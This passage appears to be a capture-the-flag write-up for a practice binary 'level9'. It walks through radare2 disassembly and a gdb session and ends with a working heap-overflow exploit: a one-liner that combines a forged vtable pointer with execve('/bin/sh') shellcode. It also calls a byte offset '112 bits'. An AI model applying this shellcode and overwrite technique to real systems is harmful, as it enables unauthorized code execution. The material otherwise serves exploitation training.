Using `radare2` we see that the program stores the params we are sending it with `operator new()`:
```bash
[0x08048540]> pdf @ sub.main_80485f4
            ;-- main:
            ; ICOD XREF from sub.entry0_8048540 @ 0x8048557(r)
┌ 166: sub.main_80485f4 (char **argv, char **envp);
│ `- args(sp[0x4..0x8]) vars(6:sp[0x8..0x24])
│           0x080485f4      55             push ebp
│           0x080485f5      89e5           mov ebp, esp
│           0x080485f7      53             push ebx
│           0x080485f8      83e4f0         and esp, 0xfffffff0
│           0x080485fb      83ec20         sub esp, 0x20
│           0x080485fe      837d0801       cmp dword [argv], 1
│       ┌─< 0x08048602      7f0c           jg 0x8048610
│       │   0x08048604      c704240100..   mov dword [esp], 1          ; int status
│       │   0x0804860b      e8e0feffff     call sym.imp._exit          ; void _exit(int status)
│       │   ; CODE XREF from sub.main_80485f4 @ 0x8048602(x)
│       └─> 0x08048610      c704246c00..   mov dword [esp], 0x6c       ; 'l'
│                                                                      ; [0x6c:4]=-1 ; 108
│           0x08048617      e814ffffff     call sym.imp.operator_new_unsigned_int_ ; operator new(unsigned int)
│           0x0804861c      89c3           mov ebx, eax
│           0x0804861e      c744240405..   mov dword [var_4h], 5       ; int32_t arg_ch
│           0x08048626      891c24         mov dword [esp], ebx        ; int32_t arg_8h
│           0x08048629      e8c8000000     call sub.method.N.N_int__80486f6 ; N::N(int)
│           0x0804862e      895c241c       mov dword [var_1ch], ebx
│           0x08048632      c704246c00..   mov dword [esp], 0x6c       ; 'l'
│                                                                      ; [0x6c:4]=-1 ; 108
│           0x08048639      e8f2feffff     call sym.imp.operator_new_unsigned_int_ ; operator new(unsigned int)
│           0x0804863e      89c3           mov ebx, eax
│           0x08048640      c744240406..   mov dword [var_4h], 6       ; int32_t arg_ch
│           0x08048648      891c24         mov dword [esp], ebx        ; int32_t arg_8h
│           0x0804864b      e8a6000000     call sub.method.N.N_int__80486f6 ; N::N(int)
│           0x08048650      895c2418       mov dword [var_18h], ebx
│           0x08048654      8b44241c       mov eax, dword [var_1ch]
│           0x08048658      89442414       mov dword [var_14h], eax
│           0x0804865c      8b442418       mov eax, dword [var_18h]
│           0x08048660      89442410       mov dword [var_10h], eax
│           0x08048664      8b450c         mov eax, dword [envp]
│           0x08048667      83c004         add eax, 4
│           0x0804866a      8b00           mov eax, dword [eax]
│           0x0804866c      89442404       mov dword [var_4h], eax     ; int32_t arg_ch
│           0x08048670      8b442414       mov eax, dword [var_14h]
│           0x08048674      890424         mov dword [esp], eax        ; int32_t arg_8h
│           0x08048677      e892000000     call sub.method.N.setAnnotation_char__804870e ; N::setAnnotation(char*)
│           0x0804867c      8b442410       mov eax, dword [var_10h]
│           0x08048680      8b00           mov eax, dword [eax]
│           0x08048682      8b10           mov edx, dword [eax]
│           0x08048684      8b442414       mov eax, dword [var_14h]
│           0x08048688      89442404       mov dword [var_4h], eax
│           0x0804868c      8b442410       mov eax, dword [var_10h]
│           0x08048690      890424         mov dword [esp], eax
│           0x08048693      ffd2           call edx
│           0x08048695      8b5dfc         mov ebx, dword [var_bp_4h]
│           0x08048698      c9             leave
└           0x08048699      c3             ret
```

With `info function` we see that there's a `memcpy()` call which we're going to try and make overflow:
```bash
0x08048510  memcpy
0x08048510  memcpy@plt
```

Using a breakpoint right after `set annotation` we find `$eax` offset:
```bash
(gdb) b *0x0804867c
Breakpoint 1 at 0x804867c
(gdb) r AAAAAAAA
Starting program: /home/user/level9/level9 AAAAAAAA

Breakpoint 1, 0x0804867c in main ()
(gdb) x/30wx $eax
0x804a00c:      0x41414141      0x41414141      0x00000000      0x00000000
0x804a01c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a02c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a03c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a04c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a05c:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a06c:      0x00000000      0x00000005      0x00000071      0x08048848
0x804a07c:      0x00000000      0x00000000
```

From the **beginning of the address** at which our program writes to the **address we found** in the memory, there's **112 bits**.
We can then calculate where to put our script:
`112 - 4 (first address) - 28 (shellcode length) - 4(second address) = 76`

So we write this script and run it:
```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
```